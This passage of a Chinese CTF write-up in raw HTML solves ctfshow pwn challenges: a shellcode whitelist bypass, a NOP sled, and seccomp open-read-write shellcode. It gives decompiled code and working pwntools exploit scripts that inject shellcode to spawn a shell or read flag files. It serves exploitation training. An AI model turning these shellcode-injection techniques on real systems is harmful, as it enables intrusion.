class="string">&quot;Your shellcode is :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !check(buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; ERROR !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  (buf)(buf);<span class="comment">//将  buf  的内容解释为一个函数指针，并以  buf  作为参数调用它。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知mmap给了buf地址处可读可写可执行的段大小为0x1000uLL，通过read读入shell最<code>(buf)(buf)</code>执行shell但是中间要过一个<code>check()</code>检查故该题只需绕过check检查使其返回值为1并写入shell即可</p><p>check函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = &amp;unk_400F20; *i &amp;&amp; *i != *a1; ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*i )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line">&amp;unk_400F20：</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>20 <span class="number">5</span>A                            unk_400F20 db  <span class="number">5</span>Ah ; Z                  ; DATA XREF: check+<span class="number">8</span>↑o</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>21 <span class="number">5</span>A                            db  <span class="number">5</span>Ah ; Z</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>22 <span class="number">4</span>A                            db  <span class="number">4</span>Ah ; J</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>23 <span class="number">20</span>                            db  <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>24 <span class="number">6</span>C                            db  <span class="number">6</span>Ch ; l</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>25 <span class="number">6F</span>                            db  <span class="number">6F</span>h ; o</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>26 <span class="number">76</span>                            db  <span class="number">76</span>h ; v</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>27 <span class="number">65</span>                            db  <span class="number">65</span>h ; e</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>28 <span class="number">73</span>                            db  <span class="number">73</span>h ; s</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>29 <span class="number">20</span>                            db  <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>2A <span class="number">73</span>                            db  <span class="number">73</span>h ; s</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>2B <span class="number">68</span>                            db  <span class="number">68</span>h ; h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>2C <span class="number">65</span>                            db  <span class="number">65</span>h ; e</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>2D <span class="number">6</span>C                            db  <span class="number">6</span>Ch ; l</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>2E <span class="number">6</span>C                            db  <span class="number">6</span>Ch ; l</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>2F <span class="number">5F</span>                            db  <span class="number">5F</span>h ; _</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>30 <span class="number">63</span>                            db  <span class="number">63</span>h ; c</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>31 <span class="number">6F</span>                            db  <span class="number">6F</span>h ; o</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>32 <span class="number">64</span>                            db  <span class="number">64</span>h ; d</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>33 <span class="number">65</span>                            db  <span class="number">65</span>h ; e</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>34 <span class="number">2</span>C                            db  <span class="number">2</span>Ch ; ,</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>35 <span class="number">61</span>                            db  <span class="number">61</span>h ; a</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>36 <span class="number">6</span>E                            db  <span class="number">6</span>Eh ; n</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>37 <span class="number">64</span>                            db  <span class="number">64</span>h ; d</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>38 <span class="number">20</span>                            db  <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>39 <span class="number">68</span>                            db  <span class="number">68</span>h ; h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>3A <span class="number">65</span>                            db  <span class="number">65</span>h ; e</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>3B <span class="number">72</span>                            db  <span class="number">72</span>h ; r</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>3C <span class="number">65</span>                            db  <span class="number">65</span>h ; e</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>3D <span class="number">20</span>                            db  <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>3E <span class="number">69</span>                            db  <span class="number">69</span>h ; i</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>3F <span class="number">73</span>                            db  <span class="number">73</span>h ; s</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>40 <span class="number">20</span>                            db  <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>41 <span class="number">61</span>                            db  <span class="number">61</span>h ; a</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>42 <span class="number">20</span>                            db  <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>43 <span class="number">67</span>                            db  <span class="number">67</span>h ; g</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>44 <span class="number">69</span>                            db  <span class="number">69</span>h ; i</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>45 <span class="number">66</span>                            db  <span class="number">66</span>h ; f</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>46 <span class="number">74</span>                            db  <span class="number">74</span>h ; t</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>47 <span class="number">3</span>A                            db  <span class="number">3</span>Ah ; :</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>48 <span class="number">0F</span>                            db  <span class="number">0F</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>49 <span class="number">05</span>                            db    <span class="number">5</span></span><br><span class="line">.rodata:<span class="number">0000000000400F</span>4A <span class="number">20</span>                            db  <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>4B <span class="number">65</span>                            db  <span class="number">65</span>h ; e</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>4C <span class="number">6</span>E                            db  <span class="number">6</span>Eh ; n</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>4D <span class="number">6</span>A                            db  <span class="number">6</span>Ah ; j</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>4E <span class="number">6F</span>                            db  <span class="number">6F</span>h ; o</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>4F <span class="number">79</span>                            db  <span class="number">79</span>h ; y</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>50 <span class="number">20</span>                            db  <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>51 <span class="number">69</span>                            db  <span class="number">69</span>h ; i</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>52 <span class="number">74</span>                            db  <span class="number">74</span>h ; t</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>53 <span class="number">21</span>                            db  <span class="number">21</span>h ; !</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>54 <span class="number">0</span>A                            db  <span class="number">0</span>Ah</span><br><span class="line">.rodata:<span class="number">0000000000400F</span>55 <span class="number">00</span>                            db    <span class="number">0</span></span><br></pre></td></tr></table></figure><p>&amp;unk_400F20是一个白名单，输入的shellcode的每一位字符要在unk_400F20中。内容为：<code>ZZJ loves shell_code, and here is a gift: \x0F\x05 (syscall指令) enjoy it!\n</code></p><p>两种思路一是使用白名单中的字符构造shell，二是绕过while循环将输入以”\x00”开头</p><p>尝试了可见字符shell没能成功所以选择思路二：</p><p>首先寻找”\x00”开头的汇编(为什么一定要找合法汇编呢，因为如果只输入一个”\x00”则在后续执行(buf)(buf)时导致执行无效指令（<code>add [rax],al</code>），引发崩溃故使用”\x00\xc0”这一合法空指令能保证后续汇编正常执行)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)],repeat=i):</span><br><span class="line">        payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;&quot;</span>.join(j)</span><br><span class="line">        res = disasm(payload)</span><br><span class="line">        <span class="keyword">if</span>(res != <span class="string">&quot;     ...&quot;</span></span><br><span class="line">           <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>,res)</span><br><span class="line">           <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res):</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><ol><li><strong>代码结构分析</strong>：<ul><li>外层循环生成1字节和2字节的机器码组合（共256种单字节和65536种双字节组合）</li><li>每个payload以<code>\x00</code>字节开头，后接生成的随机字节</li><li>使用pwntools的<code>disasm()</code>进行反汇编</li></ul></li><li><strong>筛选条件</strong>：<ul><li>必须能生成有效汇编指令（排除反汇编失败的<code>...</code>结果）</li><li>不允许包含内存访问指令（如<code>mov eax, [ebx]</code>）</li><li>不允许出现<code>.byte</code>伪指令（确保所有字节都能被识别为有效指令）</li></ul></li><li><strong>典型应用场景</strong>：<ul><li>寻找可用于缓冲区溢出的短指令（如shellcode）</li><li>测试反汇编器的容错能力</li><li>研究指令编码的边界情况</li></ul></li></ol><p>很容易的找到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:   00 c0                   add    al, al</span><br></pre></td></tr></table></figure><p>故exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28187)</span></span><br><span class="line">shellcode =<span class="string">b&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="pwn67-nop-seld空操作雪橇32位"><a href="#pwn67-nop-seld空操作雪橇32位" class="headerlink" title="pwn67 nop seld空操作雪橇32位"></a>pwn67 nop seld空操作雪橇32位</h4><blockquote><p>什么是nop sled<br>nop是一条不做任何操作的单指令，对应的十六进制编码为0x90。这里nop将被用作欺骗因子。通过创建一个大的NOP指令数组并将其放在shellcode之前，如果EIP返回到存储nop sled的任意地址，那么在达到shellcode之前，每执行一条nop指令，EIP都会递增。这就是说只要返回地址被nop sled中的某一地址所重写，EIP就会将sled滑向将正常执行的shellcode。</p><p>也就是我们现在栈中的某个位置填入大量nop指令，后边再接上我们的shellcode，然后我们控制程序的执行流从我们nop指令开始执行，那么程序就会一直执行我们之前填入的nop，执行nop之后就是我们的shellcode了，这样程序就成功的被我们pwn掉了。</p></blockquote><p>使用nop sled的情况是栈上地址在一定的范围内随机，攻击者不能够知道栈上可返回的精确地址故可通过nop滑到攻击代码处。</p><p>分析该题：</p><p>check：32位程序只开了canary 栈上可执行</p><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> position; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">1027</span>]; <span class="comment">// [esp+4h] [ebp-100Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  seed[<span class="number">1025</span>] = &amp;argc;</span><br><span class="line">  seed[<span class="number">1024</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand(seed);                                  <span class="comment">// 生成随机数</span></span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  position = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, position);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets(seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query_position函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v2 = rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">  v3 = &amp;v1 + v2;</span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于v1是局部变量所以v1在栈上可据此获得一栈上地址，因为栈上可执行可通过fgets注入shellcode，观察到最后执行v5()函数v5地址从键盘获取输入，故可将此地址改为接近攻击代码的栈上地址即可通过nop滑行到正确地址获取shell。</p><p>地址计算：<code>v2=rand()%1337 - 668</code>取模运算保证随机数在0到1336之间，故v2范围为-668~668，需要找到v1距离seed的距离</p><p>0x15(v1-ebp)+4(ebp)+4(返回地址)+16(0x10)（#最后这16个字节有点没搞懂去掉其实也能跑通）</p><p>栈上布局（图来自<a href="https://blog.csdn.net/weixin_52635170/article/details/131985518%EF%BC%89">https://blog.csdn.net/weixin_52635170/article/details/131985518）</a></p><p><img src="/../images/ret2shellcode/67.png" alt="1"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28290</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;current location: &#x27;</span>)</span><br><span class="line">addr = <span class="built_in">eval</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">shellcode = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">addr_v5=addr+<span class="number">0x2d</span>+<span class="number">668</span></span><br><span class="line">io.sendline(<span class="built_in">hex</span>(addr_v5))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="pwn69系统调用函数"><a href="#pwn69系统调用函数" class="headerlink" title="pwn69系统调用函数"></a>pwn69系统调用函数</h4><p>新知识：</p><h5 id="沙盒过滤"><a href="#沙盒过滤" class="headerlink" title="沙盒过滤"></a>沙盒过滤</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400949</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">seccomp_init</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">seccomp_load</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用<code>seccomp-tools dump ./pwn</code>查看沙箱禁用：</p><p><img src="/../images/ret2shellcode/%E6%B2%99%E7%9B%92.png" alt="1"></p><p>可以看到我们可以用的函数有read write opean exit</p><p>分析此题：</p><p>保护只开了部分 RELRO,main函数中有mmap函数分配了一段可读可写可执行的内存，有沙箱只能使用read write opean exit函数，题目提示用ORW权限去输出位于&#x2F;ctfshow_flag下的flag，故我们可以opean–&gt;read–&gt;write，来获取flag</p><p>sub_400A16函数中有栈溢出漏洞，发现有<code>jmp rsp</code></p><p>故可以在mmap分配的内存中写入opean–&gt;read–&gt;write的系统调用shell在buf里先调用read往mmap处写入payload即（opean–&gt;read–&gt;write）接着利用<code>jmp rsp</code>迁移过去执行。</p><p>ROP顺序为buf处溢出跳转执行buf上写入了的内容，接着调用read写入（opean–&gt;read–&gt;write）到mmap里并跳转执行</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28296</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/ctfshow_flag&#x27;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="string">&#x27;3&#x27;</span>, mmap, <span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>, mmap, <span class="number">100</span>)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br><span class="line"><span class="comment">#read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器</span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment"># buf的大小是0x20，加上rbp 0x8是0x28，用&#x27;\x00&#x27;去填充剩下的位置</span></span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<span class="comment">#buf地址为0x30</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(orw_shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>shellcraft可以用来自动生成提权shell的汇编也可以用来生成调用函数的汇编，但还是需要学怎么自己搓，自动化工具不好控制字节数。</p><h4 id="pwn70-64位orw"><a href="#pwn70-64位orw" class="headerlink" title="pwn70 64位orw"></a>pwn70 64位orw</h4><p>介绍几个新函数：</p><p>bzero   是一个在 Unix 和类 Unix 系统中常用的函数，用于将一块内存区域的内容设置为零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bzero(<span class="type">void</span>* s,<span class="type">size_t</span> n)</span><br></pre></td></tr></table></figure><p>s：指向要清零的内存区域 ；n：要清零的字节数</p><p>分析本题：题目提示flag位于&#x2F;flag下故应该也是一题orw的题</p><p>check发现只开了canary和部分RELRO，</p><p>ida打开发现main函数无法编译出伪代码，发现main函数中有一个<code>call rax</code>该处极有可能用于最后执行shellcode</p><p>nop掉之后得到的main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  set_secommp();</span><br><span class="line">  bzero(s, <span class="number">0x68</span>uLL);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome,tell me your name:&quot;</span>);</span><br><span class="line">  s[(read(<span class="number">0</span>, s, <span class="number">100uLL</span>) - <span class="number">1</span>)] = <span class="number">0</span>;<span class="comment">//确保最后一位为0保证是完整字符串</span></span><br><span class="line">  <span class="keyword">if</span> ( !is_printable(s) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It must be a printable name!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要关注的有set_secommp()此处使用了沙盒过滤，貌似禁用了execve可以用系统调用号&lt;0x40000000的函数</p><p><img src="/../images/ret2shellcode/%E6%B2%99%E7%9B%922.png" alt="1"></p><p>下方为main函数汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400AC1 48 8D 45 90                   lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AC5 BA 64 00 00 00                mov     edx, 64h ; &#x27;d&#x27;                  ; nbytes</span><br><span class="line">.text:0000000000400ACA 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class="line">.text:0000000000400ACD BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class="line">.text:0000000000400AD2 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400AD7 E8 C4 FB FF FF                call    _read</span><br><span class="line">.text:0000000000400AD7</span><br><span class="line">.text:0000000000400ADC 83 E8 01                      sub     eax, 1</span><br><span 